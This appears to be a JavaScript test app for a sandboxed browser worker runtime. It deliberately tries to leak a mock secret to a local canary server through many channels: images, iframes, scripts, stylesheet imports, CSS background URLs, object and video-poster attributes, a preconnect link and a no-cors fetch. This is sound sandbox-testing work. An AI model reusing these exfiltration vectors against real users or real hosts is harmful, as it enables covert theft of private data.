// Strict-runtime leak test app. Runs only in a worker; it can reach the page solely by
// asking the renderer for UI operations. It asks for every element that could leak.
const CANARY = "http://127.0.0.1:8199";
const url = (v) => `${CANARY}/leak/${v}?d=s3cr3t`;
let id = 1;
const ops = [];
const el = (tag, attrs = {}, text) => {
  const n = id++;
  ops.push({ t: "create", id: n, tag });
  for (const [name, value] of Object.entries(attrs)) ops.push({ t: "attr", id: n, name, value });
  if (text) ops.push({ t: "text", id: n, value: text });
  ops.push({ t: "append", parent: 0, id: n });
  return n;
};
const attempts = {
  "strict-img": () => el("img", { src: url("strict-img") }),
  "strict-iframe": () => el("iframe", { src: url("strict-iframe") }),
  "strict-script": () => el("script", { src: url("strict-script") }),
  "strict-link-stylesheet": () => el("link", { rel: "stylesheet", href: url("strict-link-stylesheet") }),
  "strict-style-import": () => el("style", {}, `@import url('${url("strict-style-import")}');`),
  "strict-style-attr": () => el("div", { style: `background:url('${url("strict-style-attr")}')` }, "x"),
  "strict-object": () => el("object", { data: url("strict-object"), type: "text/plain" }),
  "strict-video-poster": () => el("video", { poster: url("strict-video-poster") }),
  "strict-fetch": () => fetch(url("strict-fetch"), { mode: "no-cors" }).catch(() => {}),
};
const connectionOnly = {
  "strict-link-preconnect": () => el("link", { rel: "preconnect", href: CANARY }),
};
onmessage = (e) => {
  if (e.data?.t !== "init") return;
  const mode = e.data.mode;
  let tried;
  el("h1", {}, "Strict runtime");
  if (connectionOnly[mode]) { connectionOnly[mode](); tried = [mode]; }
  else { Object.values(attempts).forEach((f) => f()); tried = Object.keys(attempts); }
  postMessage({ ops: ops.splice(0), report: { type: "evil-done", mode, tried, hasRTC: typeof RTCPeerConnection !== "undefined" } });
};
